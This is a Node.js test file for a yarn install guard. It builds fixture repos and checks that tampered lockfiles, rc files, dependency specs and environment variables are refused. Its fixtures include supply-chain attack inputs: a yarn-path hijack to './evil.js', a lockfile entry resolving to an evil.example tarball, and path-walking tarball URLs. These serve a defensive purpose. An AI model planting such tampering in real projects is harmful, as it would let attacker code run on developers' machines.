// Fixture tests for the install guard: each refusal names its rule, and the clean trees pass.
//   node --test frontend/install-check.test.mjs

import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { after, describe, test } from 'node:test';
import { fileURLToPath } from 'node:url';
import {
	ALLOWED_INSTALL_SCRIPTS,
	INSTALL_COMMAND,
	checkBeforeInstall as checkBeforeInstallWith,
	checkInstalled,
	parseLockfile,
	parsePlainRange,
	parsePlainVersion,
	satisfiesRange
} from './install-check.mjs';

const FRONTEND = path.dirname(fileURLToPath(import.meta.url));
const REPO = path.dirname(FRONTEND);
const SCRIPT = path.join(FRONTEND, 'install-check.mjs');

// The base lockfile: web's own until the workspace move, the workspace's after it.
const BASE_LOCK_FILE = [path.join(FRONTEND, 'web', 'yarn.lock'), path.join(FRONTEND, 'yarn.lock')].find((file) =>
	fs.existsSync(file)
);
const BASE_LOCK = fs.readFileSync(BASE_LOCK_FILE, 'utf8');
const WEB_MANIFEST = fs.readFileSync(path.join(FRONTEND, 'web', 'package.json'), 'utf8');
const ROOT_MANIFEST = { private: true, workspaces: ['web', 'ui'] };
const NPMRC = 'engine-strict=true\n@zurfur:registry=https://registry.invalid/\n';
const UI_MANIFEST = { name: '@zurfur/ui', private: true, version: '0.0.0' };
const GOOD_RESOLVED = 'https://registry.yarnpkg.com/left-pad/-/left-pad-1.3.0.tgz#e8bf7a8e0b3a5f5d0f1b5d2bcd4b1d7c7f6f0a1e';
const GOOD_INTEGRITY = 'sha512-XI5MPzVNApjAyhQzphX8BkmKsKUxD4LdyK24iZeQEkPnY0Nmg5sGIaeKmGBPqmJ4wn5LHGXLwVKRbw/+EcPQcA==';

// An empty home and /etc, so the fixture checks never read the machine's own yarn config.
const CLEAN_MACHINE = fs.mkdtempSync(path.join(os.tmpdir(), 'install-check-machine-'));
after(() => fs.rmSync(CLEAN_MACHINE, { recursive: true, force: true }));
const CLEAN_HOME = path.join(CLEAN_MACHINE, 'home');
const CLEAN_ETC = path.join(CLEAN_MACHINE, 'etc');
fs.mkdirSync(CLEAN_HOME);
fs.mkdirSync(CLEAN_ETC);

/** The before-install check on a fixture: a clean environment, home and /etc unless `options` says otherwise. */
function checkBeforeInstall(root, options = {}) {
	const machine = { env: { HOME: CLEAN_HOME }, homedir: CLEAN_HOME, etc: CLEAN_ETC };
	return checkBeforeInstallWith(root, { ...machine, ...options });
}

/** The environment for a CLI run on a fixture: the caller's, without yarn's variables, over the clean home. */
function cleanCliEnv() {
	const kept = Object.entries(process.env).filter(([name]) => !/^(yarn_|npm_config_)/i.test(name) && name !== 'XDG_CONFIG_HOME');
	return { ...Object.fromEntries(kept), HOME: CLEAN_HOME };
}

function write(file, content) {
	fs.mkdirSync(path.dirname(file), { recursive: true });
	fs.writeFileSync(file, typeof content === 'string' ? content : `${JSON.stringify(content, null, '\t')}\n`);
}

/** A clean repo tree in a temp folder: the real base lockfile and web manifest, a minimal ui. */
function fixture(t, parent = os.tmpdir()) {
	const root = fs.mkdtempSync(path.join(parent, 'install-check-'));
	t.after(() => fs.rmSync(root, { recursive: true, force: true }));
	const frontend = path.join(root, 'frontend');
	write(path.join(frontend, 'package.json'), ROOT_MANIFEST);
	write(path.join(frontend, '.npmrc'), NPMRC);
	write(path.join(frontend, 'yarn.lock'), BASE_LOCK);
	write(path.join(frontend, 'web', 'package.json'), WEB_MANIFEST);
	write(path.join(frontend, 'ui', 'package.json'), UI_MANIFEST);
	return { root, frontend, file: (...parts) => path.join(frontend, ...parts) };
}

function editJson(file, edit) {
	const value = JSON.parse(fs.readFileSync(file, 'utf8'));
	edit(value);
	write(file, value);
}

function editText(file, edit) {
	const before = fs.readFileSync(file, 'utf8');
	const after = edit(before);
	assert.notEqual(after, before, 'the fixture edit changed nothing');
	fs.writeFileSync(file, after);
}

/** Edits only the lockfile block whose header line is `header`. */
function editBlock(file, header, edit) {
	editText(file, (text) => {
		const start = text.indexOf(`\n${header}\n`);
		assert.ok(start >= 0, `no block ${header}`);
		const end = text.indexOf('\n\n', start + 1);
		const stop = end < 0 ? text.length : end;
		return text.slice(0, start) + edit(text.slice(start, stop)) + text.slice(stop);
	});
}

function rulesOf(result) {
	assert.deepEqual(result.errors, [], 'unexpected unreadable-file errors');
	return new Set(result.findings.map((finding) => finding.rule));
}

function assertRefused(result, rule) {
	const rules = rulesOf(result);
	assert.ok(rules.has(rule), `expected rule ${rule}, got ${JSON.stringify(result.findings)}`);
}

/** Asserts the result holds findings and every one of them is `rule`. */
function assertOnly(result, rule) {
	const rules = rulesOf(result);
	assert.deepEqual([...rules], [rule], `expected only rule ${rule}, got ${JSON.stringify(result.findings)}`);
}

function runCli(args, env = process.env) {
	return spawnSync(process.execPath, [SCRIPT, ...args], { encoding: 'utf8', env });
}

/** Runs the CLI on a fixture root with the clean environment. */
function runFixtureCli(root, ...args) {
	return runCli([...args, '--root', root], cleanCliEnv());
}

describe('before install: the clean case', () => {
	test('the base lockfile is the shape the rules expect', () => {
		const { blocks } = parseLockfile(BASE_LOCK);
		assert.ok(blocks.length >= 319, `expected at least 319 blocks, found ${blocks.length}`);
	});

	test('a fixture from the real base lockfile and web manifest passes', (t) => {
		const { root } = fixture(t);
		assert.deepEqual(checkBeforeInstall(root), { findings: [], errors: [] });
	});

	test('the CLI exits 0 on the clean fixture', (t) => {
		const { root } = fixture(t);
		const run = runFixtureCli(root);
		assert.equal(run.status, 0, run.stdout + run.stderr);
	});
});

describe('before install: the workspace shape', () => {
	for (const [label, edit] of [
		['root scripts', (m) => (m.scripts = { postinstall: 'node x.js' })],
		['root dependencies', (m) => (m.dependencies = { 'left-pad': '^1.3.0' })],
		['root devDependencies', (m) => (m.devDependencies = { 'left-pad': '^1.3.0' })],
		['root resolutions', (m) => (m.resolutions = { 'left-pad': '1.3.0' })],
		['private not true', (m) => (m.private = false)]
	]) {
		test(`refuses ${label}`, (t) => {
			const { root, file } = fixture(t);
			editJson(file('package.json'), edit);
			assertRefused(checkBeforeInstall(root), 'root-keys');
		});
	}

	for (const workspaces of [['web'], ['ui', 'web'], ['web', 'ui', 'extra'], ['web', 'ui/*'], 'web', undefined]) {
		test(`refuses workspaces ${JSON.stringify(workspaces)}`, (t) => {
			const { root, file } = fixture(t);
			editJson(file('package.json'), (m) => (m.workspaces = workspaces));
			assertRefused(checkBeforeInstall(root), 'workspaces');
		});
	}

	for (const folder of ['..', '.', 'web', 'ui']) {
		for (const name of ['.yarnrc', '.yarnrc.yml']) {
			test(`refuses ${name} in ${{ '..': 'the repo root', '.': 'frontend' }[folder] ?? `frontend/${folder}`}`, (t) => {
				const { root, file } = fixture(t);
				write(file(folder, name), 'yarn-path "./evil.js"\n');
				assertRefused(checkBeforeInstall(root), 'yarnrc');
			});
		}
	}

	for (const folder of ['..', 'web', 'ui']) {
		test(`refuses a second .npmrc in ${folder === '..' ? 'the repo root' : `frontend/${folder}`}`, (t) => {
			const { root, file } = fixture(t);
			write(file(folder, '.npmrc'), 'engine-strict=true\n');
			assertRefused(checkBeforeInstall(root), 'npmrc-extra');
		});
	}

	for (const [label, text] of [
		['an extra line', `${NPMRC}ignore-scripts=false\n`],
		['a missing line', 'engine-strict=true\n'],
		['a repeated line', `${NPMRC}engine-strict=true\n`],
		['another registry', 'engine-strict=true\n@zurfur:registry=https://registry.npmjs.org/\n']
	]) {
		test(`refuses frontend/.npmrc with ${label}`, (t) => {
			const { root, file } = fixture(t);
			write(file('.npmrc'), text);
			assertRefused(checkBeforeInstall(root), 'npmrc-lines');
		});
	}

	test('refuses a missing frontend/.npmrc', (t) => {
		const { root, file } = fixture(t);
		fs.rmSync(file('.npmrc'));
		assertRefused(checkBeforeInstall(root), 'npmrc-lines');
	});
});

describe('before install: the manifests', () => {
	test('refuses a range missing from the lockfile', (t) => {
		const { root, file } = fixture(t);
		editJson(file('ui', 'package.json'), (m) => (m.devDependencies = { 'left-pad': '^1.3.0' }));
		assertRefused(checkBeforeInstall(root), 'spec-unlocked');
	});

	for (const field of ['dependencies', 'optionalDependencies']) {
		test(`refuses an unlocked range in web's ${field}`, (t) => {
			const { root, file } = fixture(t);
			editJson(file('web', 'package.json'), (m) => (m[field] = { ...m[field], 'left-pad': '^1.3.0' }));
			assertRefused(checkBeforeInstall(root), 'spec-unlocked');
		});
	}

	test('allows the exact workspace link and nothing near it', (t) => {
		const { root, file } = fixture(t);
		editJson(file('web', 'package.json'), (m) => (m.devDependencies['@zurfur/ui'] = '0.0.0'));
		assert.deepEqual(checkBeforeInstall(root), { findings: [], errors: [] });
		editJson(file('web', 'package.json'), (m) => (m.devDependencies['@zurfur/ui'] = '^0.0.0'));
		assertRefused(checkBeforeInstall(root), 'spec-unlocked');
	});

	for (const spec of [
		'file:../ui',
		'link:../ui',
		'git+https://github.com/a/b.git',
		'git://github.com/a/b.git',
		'git+ssh://git@github.com/a/b.git',
		'github:a/b',
		'a/b',
		'https://example.com/left-pad-1.3.0.tgz',
		'./left-pad-1.3.0.tgz',
		'left-pad-1.3.0.tgz',
		'npm:left-pad@1.3.0',
		'workspace:*',
		'latest',
		'>=1.3.0',
		'^1.3',
		'1.x',
		''
	]) {
		test(`refuses the spec ${JSON.stringify(spec)}`, (t) => {
			const { root, file } = fixture(t);
			editJson(file('ui', 'package.json'), (m) => (m.dependencies = { 'left-pad': spec }));
			assertRefused(checkBeforeInstall(root), 'spec-exotic');
		});
	}
});

describe('before install: the lockfile', () => {
	test('refuses another lockfile header', (t) => {
		const { root, file } = fixture(t);
		editText(file('yarn.lock'), (text) => text.replace('# yarn lockfile v1', '# yarn lockfile v2'));
		assertRefused(checkBeforeInstall(root), 'lock-header');
	});

	test('refuses a key repeated in two blocks', (t) => {
		const { root, file } = fixture(t);
		const { blocks } = parseLockfile(BASE_LOCK);
		const key = blocks[0].keys[0];
		const duplicate = `"${key}":\n  version "9.9.9"\n  resolved "${GOOD_RESOLVED}"\n  integrity ${GOOD_INTEGRITY}\n`;
		editText(file('yarn.lock'), (text) => `${text}\n${duplicate}`);
		assertRefused(checkBeforeInstall(root), 'lock-duplicate');
	});

	test('refuses a key repeated in one block header', (t) => {
		const { root, file } = fixture(t);
		const block = `"left-pad@^1.3.0", "left-pad@^1.3.0":\n  version "1.3.0"\n  resolved "${GOOD_RESOLVED}"\n  integrity ${GOOD_INTEGRITY}\n`;
		editText(file('yarn.lock'), (text) => `${text}\n${block}`);
		assertRefused(checkBeforeInstall(root), 'lock-duplicate');
	});

	test('refuses a field repeated in one block', (t) => {
		const { root, file } = fixture(t);
		const block = `"left-pad@^1.3.0":\n  version "1.3.0"\n  resolved "${GOOD_RESOLVED}"\n  resolved "https://evil.example/left-pad.tgz"\n  integrity ${GOOD_INTEGRITY}\n`;
		editText(file('yarn.lock'), (text) => `${text}\n${block}`);
		assertRefused(checkBeforeInstall(root), 'lock-duplicate');
	});

	test('refuses a resolved on another host', (t) => {
		const { root, file } = fixture(t);
		editText(file('yarn.lock'), (text) =>
			text.replace('resolved "https://registry.yarnpkg.com/', 'resolved "https://registry.npmjs.org/')
		);
		assertRefused(checkBeforeInstall(root), 'lock-resolved');
	});

	test('refuses a block with no resolved', (t) => {
		const { root, file } = fixture(t);
		editText(file('yarn.lock'), (text) => text.replace(/\n {2}resolved [^\n]*/, ''));
		assertRefused(checkBeforeInstall(root), 'lock-resolved');
	});

	test('refuses a block with no integrity', (t) => {
		const { root, file } = fixture(t);
		editText(file('yarn.lock'), (text) => text.replace(/\n {2}integrity [^\n]*/, ''));
		assertRefused(checkBeforeInstall(root), 'lock-integrity');
	});

	test('refuses a sha1-only integrity', (t) => {
		const { root, file } = fixture(t);
		editText(file('yarn.lock'), (text) =>
			text.replace(/\n {2}integrity [^\n]*/, '\n  integrity sha1-6L96jw46VU7dg3wXxJ+i8GU4ItI=')
		);
		assertRefused(checkBeforeInstall(root), 'lock-integrity');
	});

	test('refuses a block with no version', (t) => {
		const { root, file } = fixture(t);
		editText(file('yarn.lock'), (text) => text.replace(/\n {2}version [^\n]*/, ''));
		assertRefused(checkBeforeInstall(root), 'lock-version');
	});

	for (const key of ['@zurfur/ui@0.0.0', 'web@0.0.1']) {
		test(`refuses a workspace block ${key}`, (t) => {
			const { root, file } = fixture(t);
			const block = `"${key}":\n  version "0.0.0"\n  resolved "${GOOD_RESOLVED}"\n  integrity ${GOOD_INTEGRITY}\n`;
			editText(file('yarn.lock'), (text) => `${text}\n${block}`);
			assertRefused(checkBeforeInstall(root), 'lock-workspace');
		});
	}

	test('reports a malformed lockfile as unreadable', (t) => {
		const { root, file } = fixture(t);
		editText(file('yarn.lock'), (text) => `${text}\n<<<<<<< HEAD\n`);
		const result = checkBeforeInstall(root);
		assert.ok(result.errors.some((error) => error.includes('unreadable lockfile')), JSON.stringify(result));
	});

	test('reports a missing workspace manifest as unreadable', (t) => {
		const { root, file } = fixture(t);
		fs.rmSync(file('ui', 'package.json'));
		const result = checkBeforeInstall(root);
		assert.ok(result.errors.some((error) => error.includes('frontend/ui/package.json')), JSON.stringify(result));
	});
});

const KIT_HEADER = '"@sveltejs/kit@^2.63.0":';
const ADAPTER_HEADER = '"@sveltejs/adapter-static@^3.0.10":';
const ROLLUP_HEADER = 'rollup@^4.59.0:';
const ADAPTER_RESOLVED =
	'https://registry.yarnpkg.com/@sveltejs/adapter-static/-/adapter-static-3.0.10.tgz#526ab78cd1d3a861dd0233e8ff34a204af40d595';
const SHA1 = '526ab78cd1d3a861dd0233e8ff34a204af40d595';

describe('before install: what lockfile blocks depend on', () => {
	test("refuses kit's cookie range with no block (a dependency yarn would fetch unlocked)", (t) => {
		const { root, file } = fixture(t);
		editBlock(file('yarn.lock'), KIT_HEADER, (block) => block.replace('    cookie "^0.6.0"', '    cookie "^0.7.0"'));
		const result = checkBeforeInstall(root);
		assertOnly(result, 'lock-dependency-unlocked');
		assert.equal(result.findings.length, 1, JSON.stringify(result.findings));
		assert.match(result.findings[0].message, /line \d+ .*"cookie@\^0\.7\.0"/);
	});

	test('refuses an optionalDependencies range with no block', (t) => {
		const { root, file } = fixture(t);
		editBlock(file('yarn.lock'), ROLLUP_HEADER, (block) =>
			block.replace('    "@rollup/rollup-android-arm-eabi" "4.62.2"', '    "@rollup/rollup-android-arm-eabi" "4.62.3"')
		);
		assertOnly(checkBeforeInstall(root), 'lock-dependency-unlocked');
	});

	test('refuses a dependency name that is not a package name', (t) => {
		const { root, file } = fixture(t);
		editBlock(file('yarn.lock'), KIT_HEADER, (block) => block.replace('    cookie "^0.6.0"', '    "cookie@x" "^0.6.0"'));
		assertOnly(checkBeforeInstall(root), 'lock-field');
	});
});

const COOKIE_HEADER = 'cookie@^0.6.0:';

describe("before install: a block's version satisfies its keys", () => {
	test("refuses a renamed range: kit's cookie and cookie's key moved to ^0.7.0 over 0.6.0", (t) => {
		const { root, file } = fixture(t);
		editBlock(file('yarn.lock'), KIT_HEADER, (block) => block.replace('    cookie "^0.6.0"', '    cookie "^0.7.0"'));
		editText(file('yarn.lock'), (text) => text.replace(`\n${COOKIE_HEADER}\n`, '\ncookie@^0.7.0:\n'));
		const result = checkBeforeInstall(root);
		assertOnly(result, 'lock-satisfies');
		assert.equal(result.findings.length, 1, JSON.stringify(result.findings));
		assert.match(result.findings[0].message, /version "0\.6\.0" does not satisfy the key "cookie@\^0\.7\.0"/);
	});

	test("refuses a file: range planted in kit's cookie and in cookie's keys", (t) => {
		const { root, file } = fixture(t);
		editBlock(file('yarn.lock'), KIT_HEADER, (block) => block.replace('    cookie "^0.6.0"', '    cookie "file:../x"'));
		editText(file('yarn.lock'), (text) => text.replace(`\n${COOKIE_HEADER}\n`, '\ncookie@^0.6.0, "cookie@file:../x":\n'));
		const result = checkBeforeInstall(root);
		assertOnly(result, 'lock-range');
		const messages = result.findings.map((finding) => finding.message);
		assert.equal(messages.length, 2, JSON.stringify(messages));
		assert.ok(messages.some((message) => message.includes('dependencies "cookie" has the range "file:../x"')), JSON.stringify(messages));
		assert.ok(messages.some((message) => message.includes('key "cookie@file:../x" has the range "file:../x"')), JSON.stringify(messages));
	});

	test("refuses cookie's block moved to 0.5.0 under its ^0.6.0 key", (t) => {
		const { root, file } = fixture(t);
		const resolved = `https://registry.yarnpkg.com/cookie/-/cookie-0.5.0.tgz#${SHA1}`;
		editBlock(file('yarn.lock'), COOKIE_HEADER, (block) =>
			block
				.replace('version "0.6.0"', 'version "0.5.0"')
				.replace(/resolved "[^"]+"/, `resolved "${resolved}"`)
				.replace(/integrity \S+/, `integrity ${GOOD_INTEGRITY}`)
		);
		const result = checkBeforeInstall(root);
		assertOnly(result, 'lock-satisfies');
		assert.equal(result.findings.length, 1, JSON.stringify(result.findings));
		assert.match(result.findings[0].message, /version "0\.5\.0" does not satisfy the key "cookie@\^0\.6\.0"/);
	});

	test('refuses a version with a leading-zero prerelease number', (t) => {
		const { root, file } = fixture(t);
		editBlock(file('yarn.lock'), COOKIE_HEADER, (block) => block.replace('version "0.6.0"', 'version "0.6.0-01"'));
		assertRefused(checkBeforeInstall(root), 'lock-version');
	});
});

const EXOTIC_RANGES = Object.freeze([
	'file:../x',
	'link:../x',
	'ui',
	'latest',
	'npm:left-pad@1.3.0',
	'>=1.0.0',
	'1.x',
	'^1.2',
	'v1.2.3',
	'^01.2.3',
	'^1.2.3+build',
	'1.2.3 - 2.0.0',
	'^1.0.0||^2.0.0',
	''
]);

describe('before install: every range is a plain range', () => {
	for (const range of EXOTIC_RANGES) {
		test(`refuses the dependency range ${JSON.stringify(range)}`, (t) => {
			const { root, file } = fixture(t);
			editBlock(file('yarn.lock'), KIT_HEADER, (block) => block.replace('    cookie "^0.6.0"', `    cookie ${JSON.stringify(range)}`));
			const result = checkBeforeInstall(root);
			assertRefused(result, 'lock-range');
			const message = result.findings.find((finding) => finding.rule === 'lock-range').message;
			assert.ok(message.includes(`dependencies "cookie" has the range ${JSON.stringify(range)}`), message);
			assert.ok(message.includes('the guard reads only *, X.Y.Z'), message);
		});

		test(`refuses the key range ${JSON.stringify(range)}`, (t) => {
			const { root, file } = fixture(t);
			const key = JSON.stringify(`cookie@${range}`);
			editText(file('yarn.lock'), (text) => text.replace(`\n${COOKIE_HEADER}\n`, `\ncookie@^0.6.0, ${key}:\n`));
			const result = checkBeforeInstall(root);
			assertOnly(result, 'lock-range');
			assert.ok(result.findings[0].message.includes(`key ${key} has the range ${JSON.stringify(range)}`), result.findings[0].message);
		});
	}

	test('refuses a key with no range', (t) => {
		const { root, file } = fixture(t);
		editText(file('yarn.lock'), (text) => text.replace(`\n${COOKIE_HEADER}\n`, '\ncookie@^0.6.0, cookie:\n'));
		assertOnly(checkBeforeInstall(root), 'lock-range');
	});

	test('refuses an optionalDependencies range that is not plain', (t) => {
		const { root, file } = fixture(t);
		editBlock(file('yarn.lock'), ROLLUP_HEADER, (block) =>
			block.replace('    "@rollup/rollup-android-arm-eabi" "4.62.2"', '    "@rollup/rollup-android-arm-eabi" "latest"')
		);
		assertRefused(checkBeforeInstall(root), 'lock-range');
	});

	test('every range in the base lockfile parses', () => {
		const { blocks } = parseLockfile(BASE_LOCK);
		const ranges = blocks.flatMap((block) => [
			...block.keys.map((key) => key.slice(key.indexOf('@', 1) + 1)),
			...['dependencies', 'optionalDependencies'].flatMap((field) => [...(block.fields.get(field)?.values() ?? [])])
		]);
		assert.ok(ranges.length >= 799, `expected at least 799 ranges, found ${ranges.length}`);
		assert.deepEqual(ranges.filter((range) => parsePlainRange(range) === null), []);
	});
});

/** Known node-semver `satisfies` answers: [version, range, satisfied]. */
const SATISFIES_TABLE = Object.freeze([
	['1.2.3', '^1.2.3', true],
	['1.9.9', '^1.2.3', true],
	['1.2.2', '^1.2.3', false],
	['2.0.0', '^1.2.3', false],
	['0.6.5', '^0.6.0', true],
	['0.7.0', '^0.6.0', false],
	['0.5.9', '^0.6.0', false],
	['0.0.3', '^0.0.3', true],
	['0.0.4', '^0.0.3', false],
	['0.0.0', '^0.0.0', true],
	['0.0.1', '^0.0.0', false],
	['1.2.9', '~1.2.3', true],
	['1.3.0', '~1.2.3', false],
	['1.2.2', '~1.2.3', false],
	['0.1.5', '~0.1.2', true],
	['0.2.0', '~0.1.2', false],
	['1.2.3', '=1.2.3', true],
	['1.2.4', '=1.2.3', false],
	['1.2.3', '1.2.3', true],
	['1.2.3+build.5', '1.2.3', true],
	['1.2.4', '1.2.3', false],
	['0.0.1', '*', true],
	['99.0.0', '*', true],
	['1.0.0-rc.1', '*', false],
	['24.9.1', '^24', true],
	['24.0.0', '^24', true],
	['25.0.0', '^24', false],
	['23.9.9', '^24', false],
	['0.99.0', '^0', true],
	['1.0.0', '^0', false],
	['2.5.0', '^1.0.0 || ^2.0.0', true],
	['3.0.0', '^1.0.0 || ^2.0.0', false],
	['0.3.1', '^0.2.0 || ^0.3.0 || ^0.4.0', true],
	['0.5.0', '^0.2.0 || ^0.3.0 || ^0.4.0', false],
	['1.0.0-next.29', '^1.0.0-next.24', true],
	['1.0.0-next.3', '^1.0.0-next.24', false],
	['1.0.0', '^1.0.0-next.24', true],
	['1.5.0', '^1.0.0-next.24', true],
	['1.1.0-next.30', '^1.0.0-next.24', false],
	['2.0.0-rc.1', '^1.0.0', false],
	['1.2.4-rc.1', '^1.2.3', false],
	['1.2.4-rc.1', '~1.2.3', false],
	['4.0.0-rc.2', '^4.0.0-rc.1', true],
	['4.0.0-rc.1', '^4.0.0-rc.1', true],
	['4.0.0-beta.9', '^4.0.0-rc.1', false],
	['1.0.0-rc.1', '1.0.0-rc.1', true],
	['1.0.0-rc.1', '=1.0.0-rc.2', false],
	['1.2.3-rc.2', '~1.2.3-rc.1', true],
	['24.0.0-rc.1', '^24', false],
	['1.0.0-alpha', '^1.0.0-1', true],
	['1.0.0-1', '^1.0.0-alpha', false],
	['1.0.0-2', '^1.0.0-10', false],
	['1.0.0-10', '^1.0.0-2', true],
	['1.0.0-alpha.1', '^1.0.0-alpha', true],
	['1.0.0-alpha', '^1.0.0-alpha.1', false],
	['1.0.0-beta', '^1.0.0-alpha.1', true],
	['1.0.0-Beta', '^1.0.0-alpha', false],
	['1.0.0-alpha.10', '^1.0.0-alpha.9', true],
	['1.0.0-alpha.9a', '^1.0.0-alpha.10', true]
]);

describe('the range matcher', () => {
	for (const [version, range, satisfied] of SATISFIES_TABLE) {
		test(`${version} ${satisfied ? 'satisfies' : 'does not satisfy'} ${range}`, () => {
			const parsedVersion = parsePlainVersion(version);
			const parsedRange = parsePlainRange(range);
			assert.notEqual(parsedVersion, null, version);
			assert.notEqual(parsedRange, null, range);
			assert.equal(satisfiesRange(parsedVersion, parsedRange), satisfied);
		});
	}

	for (const range of EXOTIC_RANGES) {
		test(`does not parse the range ${JSON.stringify(range)}`, () => {
			assert.equal(parsePlainRange(range), null);
		});
	}

	for (const version of ['1.2', 'v1.2.3', '01.2.3', '1.2.3-01', '1.2.3-', '1.2.3-a..b', '9007199254740992.0.0', '1.2.3-9007199254740992']) {
		test(`does not parse the version ${JSON.stringify(version)}`, () => {
			assert.equal(parsePlainVersion(version), null);
		});
	}
});

/** A temp home and /etc for the rc-file checks, with the options that point the guard at them. */
function machine(t) {
	const base = fs.mkdtempSync(path.join(os.tmpdir(), 'install-check-machine-'));
	t.after(() => fs.rmSync(base, { recursive: true, force: true }));
	const home = path.join(base, 'home');
	const etc = path.join(base, 'etc');
	fs.mkdirSync(home);
	fs.mkdirSync(etc);
	return { base, home, etc, options: { env: { HOME: home }, homedir: home, etc } };
}

const SECRET = 'npm_secretTokenValue123';

describe('before install: yarn config outside the repo', () => {
	for (const [place, ...parts] of [
		['etc', 'yarn', 'config'],
		['etc', 'yarnrc'],
		['home', '.config', 'yarn', 'config'],
		['home', '.config', 'yarn'],
		['home', '.yarn', 'config'],
		['home', '.yarnrc'],
		['home', '.yarnrc.yml']
	]) {
		test(`refuses ${place === 'etc' ? '/etc' : '$HOME'}/${parts.join('/')}`, (t) => {
			const { root } = fixture(t);
			const box = machine(t);
			const rc = path.join(box[place], ...parts);
			write(rc, 'yarn-path "./evil.js"\n');
			const result = checkBeforeInstall(root, box.options);
			assertOnly(result, 'yarnrc-outside');
			assert.ok(result.findings.some((finding) => finding.file === rc), JSON.stringify(result.findings));
		});
	}

	test("refuses yarn's config folder under XDG_CONFIG_HOME read as a file", (t) => {
		const { root } = fixture(t);
		const box = machine(t);
		const rc = path.join(box.base, 'xdg', 'yarn');
		write(rc, 'yarn-path "./evil.js"\n');
		const result = checkBeforeInstall(root, { ...box.options, env: { HOME: box.home, XDG_CONFIG_HOME: path.join(box.base, 'xdg') } });
		assertOnly(result, 'yarnrc-outside');
		assert.deepEqual(result.findings.map((finding) => finding.file), [rc]);
	});

	test("refuses yarn's config folder under the home folder without HOME", (t) => {
		const { root } = fixture(t);
		const box = machine(t);
		write(path.join(box.home, '.config', 'yarn'), 'yarn-path "./evil.js"\n');
		assertOnly(checkBeforeInstall(root, { ...box.options, env: {} }), 'yarnrc-outside');
	});

	test('passes folders at the rc paths ($HOME/.config/yarn is yarn global folder)', (t) => {
		const { root } = fixture(t);
		const box = machine(t);
		fs.mkdirSync(path.join(box.home, '.config', 'yarn', 'global'), { recursive: true });
		fs.mkdirSync(path.join(box.home, '.yarn', 'config'), { recursive: true });
		fs.mkdirSync(path.join(box.home, '.yarnrc'));
		assert.deepEqual(checkBeforeInstall(root, box.options), { findings: [], errors: [] });
	});

	test('passes a dangling symlink and refuses a symlink to a file', (t) => {
		const { root } = fixture(t);
		const box = machine(t);
		fs.symlinkSync(path.join(box.base, 'nowhere'), path.join(box.home, '.yarnrc'));
		assert.deepEqual(checkBeforeInstall(root, box.options), { findings: [], errors: [] });
		write(path.join(box.base, 'target'), 'yarn-path "./evil.js"\n');
		fs.symlinkSync(path.join(box.base, 'target'), path.join(box.home, '.yarnrc.yml'));
		assertOnly(checkBeforeInstall(root, box.options), 'yarnrc-outside');
	});

	test('refuses an rc path yarn would fail to read', (t) => {
		const { root } = fixture(t);
		const box = machine(t);
		write(path.join(box.etc, 'yarn'), 'not a folder\n');
		const result = checkBeforeInstall(root, box.options);
		assertOnly(result, 'yarnrc-outside');
		assert.match(result.findings[0].message, /cannot stat \(ENOTDIR\)/);
	});

	for (const name of ['.yarnrc', '.yarnrc.yml']) {
		test(`refuses a ${name} in a folder above the repo root`, (t) => {
			const box = machine(t);
			const outer = path.join(box.base, 'outer');
			fs.mkdirSync(path.join(outer, 'nested'), { recursive: true });
			const { root } = fixture(t, path.join(outer, 'nested'));
			const rc = path.join(outer, name);
			write(rc, 'yarn-path "./evil.js"\n');
			const result = checkBeforeInstall(root, box.options);
			assertOnly(result, 'yarnrc-outside');
			assert.deepEqual(result.findings.map((finding) => finding.file), [rc]);
		});
	}

	for (const name of ['YARN_X', 'yarn_x', 'Npm_Config_Registry']) {
		test(`refuses the variable ${name}, naming it without its value`, (t) => {
			const { root } = fixture(t);
			const box = machine(t);
			const result = checkBeforeInstall(root, { ...box.options, env: { HOME: box.home, [name]: SECRET } });
			assertOnly(result, 'yarn-env');
			assert.equal(result.findings.length, 1, JSON.stringify(result.findings));
			assert.ok(result.findings[0].message.startsWith(`${name} is set`), result.findings[0].message);
			assert.ok(!JSON.stringify(result.findings).includes(SECRET), JSON.stringify(result.findings));
		});
	}

	test('passes a clean environment, near misses included', (t) => {
		const { root } = fixture(t);
		const box = machine(t);
		const env = { HOME: box.home, PATH: '/usr/bin', YARN: 'x', NPM_TOKEN: 'x', npm_config: 'x', MY_YARN_X: 'x' };
		assert.deepEqual(checkBeforeInstall(root, { ...box.options, env }), { findings: [], errors: [] });
	});

	test('the CLI prints the variable name and never its value', (t) => {
		const { root } = fixture(t);
		const run = runCli(['--root', root], { ...cleanCliEnv(), YARN_REGISTRY: SECRET });
		assert.equal(run.status, 1, run.stdout + run.stderr);
		assert.ok(run.stdout.split('\n').some((line) => line.startsWith('environment: [yarn-env] YARN_REGISTRY is set')), run.stdout);
		assert.ok(!(run.stdout + run.stderr).includes(SECRET), run.stdout + run.stderr);
	});
});

describe('before install: resolved is the registry tarball of the block', () => {
	for (const [label, resolved] of [
		['another package (left-pad)', `https://registry.yarnpkg.com/left-pad/-/left-pad-1.3.0.tgz#${SHA1}`],
		['the right name at another version', ADAPTER_RESOLVED.replace('adapter-static-3.0.10.tgz', 'adapter-static-3.0.9.tgz')],
		['a scoped package with the wrong basename', ADAPTER_RESOLVED.replace('/-/adapter-static-', '/-/adapter-node-')],
		['a scoped basename that keeps its scope', ADAPTER_RESOLVED.replace('/-/adapter-static-', '/-/sveltejs-adapter-static-')],
		['no #sha1', ADAPTER_RESOLVED.slice(0, ADAPTER_RESOLVED.indexOf('#'))],
		['an empty #sha1', ADAPTER_RESOLVED.slice(0, ADAPTER_RESOLVED.indexOf('#') + 1)],
		['a short hash', ADAPTER_RESOLVED.slice(0, -1)],
		['a long hash', `${ADAPTER_RESOLVED}0`],
		['an uppercase hash', ADAPTER_RESOLVED.replace(SHA1, SHA1.toUpperCase())],
		['http://', ADAPTER_RESOLVED.replace('https://', 'http://')],
		['a query', ADAPTER_RESOLVED.replace('.tgz#', '.tgz?x=1#')],
		['an extra path segment', ADAPTER_RESOLVED.replace('/-/', '/-/x/')],
		['a path walk', ADAPTER_RESOLVED.replace('/-/', '/-/../../left-pad/-/')]
	]) {
		test(`refuses a resolved pointing at ${label}`, (t) => {
			const { root, file } = fixture(t);
			editBlock(file('yarn.lock'), ADAPTER_HEADER, (block) => block.replace(ADAPTER_RESOLVED, resolved));
			assertOnly(checkBeforeInstall(root), 'lock-resolved');
		});
	}

	test('refuses a version that walks the tarball path', (t) => {
		const { root, file } = fixture(t);
		const version = '1.3.0/../../../evil/-/evil-6.6.6';
